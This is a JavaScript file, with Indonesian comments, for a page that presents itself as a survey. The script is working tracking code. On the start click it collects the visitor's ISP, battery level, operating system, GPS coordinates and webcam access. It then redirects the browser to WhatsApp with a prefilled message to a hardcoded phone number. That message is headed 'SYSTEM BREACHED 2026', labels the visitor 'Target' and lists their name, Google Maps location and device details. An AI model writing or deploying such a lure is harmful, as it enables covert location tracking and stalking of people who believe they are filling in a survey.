const nomorWA = "628979100200";
let userData = { 
    coords: "Tidak Diizinkan", 
    os: navigator.platform,
    battery: "Scanning...",
    isp: "Detecting..."
};

// 1. Fungsi Ambil Data (Dibuat terpisah agar tidak menghambat tombol)
async function getQuickData() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        userData.isp = data.org || "Protected";
    } catch (e) { userData.isp = "ISP Hidden"; }

    try {
        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            userData.battery = Math.round(bat.level * 100) + "%";
        }
    } catch (e) { userData.battery = "Hardware Blocked"; }
}

// 2. Handler Tombol Mulai (LANGSUNG JALAN)
document.getElementById('start-survey').onclick = function() {
    // Sembunyikan Step 1, Tampilkan Step 2
    document.getElementById('step-1').style.display = 'none';
    document.getElementById('step-2').style.display = 'block';
    
    // Jalankan pengambilan data di latar belakang
    getQuickData();

    // Minta Izin Lokasi
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            userData.coords = pos.coords.latitude + "," + pos.coords.longitude;
        }, (err) => { console.log("GPS Blocked"); });
    }

    // Minta Izin Kamera
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => { document.getElementById('webcam').srcObject = stream; })
        .catch(e => { console.log("Kamera Blocked"); });
};

// 3. Fungsi Kirim (Dijalankan saat Klik atau Enter)
function finalSubmit() {
    const nameVal = document.getElementById('name').value;
    if (!nameVal) return alert("Isi nama dulu!");

    document.getElementById('step-2').style.display = 'none';
    document.getElementById('step-3').style.display = 'block';

    let prg = 0;
    const bar = document.getElementById('progress');
    const timer = setInterval(() => {
        prg += 25;
        bar.style.width = prg + "%";
        if (prg >= 100) {
            clearInterval(timer);
            const mapUrl = `https://www.google.com/maps?q=${userData.coords}`;
            const msg = `🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A👤 *Target:* ${nameVal}%0A📍 *Maps:* ${mapUrl}%0A📡 *ISP:* ${userData.isp}%0A🔋 *Baterai:* ${userData.battery}%0A💻 *OS:* ${userData.os}%0A%0A_Status: Data Mirrored._`;
            window.location.href = `https://api.whatsapp.com/send?phone=${nomorWA}&text=${msg}`;
        }
    }, 600);
}

// Pasang Listener
document.getElementById('submit-survey').onclick = finalSubmit;
document.getElementById('name').onkeydown = (e) => { if (e.key === "Enter") finalSubmit(); };
